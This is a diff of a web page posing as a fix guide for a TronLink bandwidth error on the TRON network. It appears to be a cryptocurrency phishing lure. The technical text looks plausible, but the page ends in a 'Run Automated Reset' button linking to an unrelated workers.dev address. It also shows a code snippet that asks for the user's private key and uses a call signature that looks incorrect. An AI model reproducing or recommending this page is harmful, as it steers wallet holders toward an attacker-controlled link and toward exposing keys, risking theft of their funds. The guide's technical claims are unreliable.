@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #1a1a24;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,29 +42,32 @@
 <h1>Tronlink Bandwidth Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message indicating a bandwidth issue when attempting to perform transactions or interact with smart contracts on the TRON network using TronLink.</li>
+<li>Users encounter a "Tronlink Bandwidth Error" message when attempting to perform transactions or interact with smart contracts on the TRON network, indicating insufficient bandwidth for the operation.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth points (BP) in the user's account, which are required to process transactions on the TRON network. Each transaction consumes a certain amount of bandwidth, and if the account's bandwidth is depleted, transactions cannot be executed.</li>
+<li>The error occurs due to the TRON network's bandwidth mechanism, which requires users to have a certain amount of bandwidth (measured in bandwidth points) to perform transactions. If a user's available bandwidth is depleted, they must wait for it to recharge or acquire more through freezing TRX.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase bandwidth points by freezing TRX tokens, which can be done through the TronLink wallet interface or using the following command:</li>
+<li>Freeze additional TRX to increase bandwidth points: This can be done through the TRON wallet or exchange.</li>
+<li>Wait for bandwidth to recharge: Bandwidth recharges over time, allowing for a limited number of free transactions per day.</li>
+<li>Use a bandwidth delegation service: Some services allow users to delegate their unused bandwidth to others in exchange for a fee.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>tronweb.toSun<span class="o">(</span><span class="m">100</span><span class="o">)</span>,<span class="w"> </span><span class="m">3</span><span class="o">)</span><span class="p">;</span>
+<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>
+<span class="w">  </span><span class="s1">&#39;your_address&#39;</span>,
+<span class="w">  </span><span class="s1">&#39;your_private_key&#39;</span>,
+<span class="w">  </span><span class="m">10000</span>,
+<span class="w">  </span><span class="m">3</span>
+<span class="o">)</span>
 </code></pre></div>
 
-<ul>
-<li>Alternatively, purchase additional bandwidth from other users on the network.</li>
-<li>Adjust transaction parameters to reduce bandwidth consumption.</li>
-</ul>
-<p>Prerequisites
-* TRON network account with TronLink wallet
-* Basic understanding of TRON's bandwidth system
-* Sufficient TRX tokens for freezing or purchasing bandwidth</p>
-<p>Consider utilizing an external console for more complex transaction adjustments.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li></ul>
+<p>Prerequisites:
+* A TRON wallet with a sufficient balance of TRX
+* Knowledge of the TRON blockchain and its bandwidth mechanism
+* Access to the TRON network through a compatible wallet or interface
+For more complex operations, consider utilizing an external console for enhanced control and flexibility.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
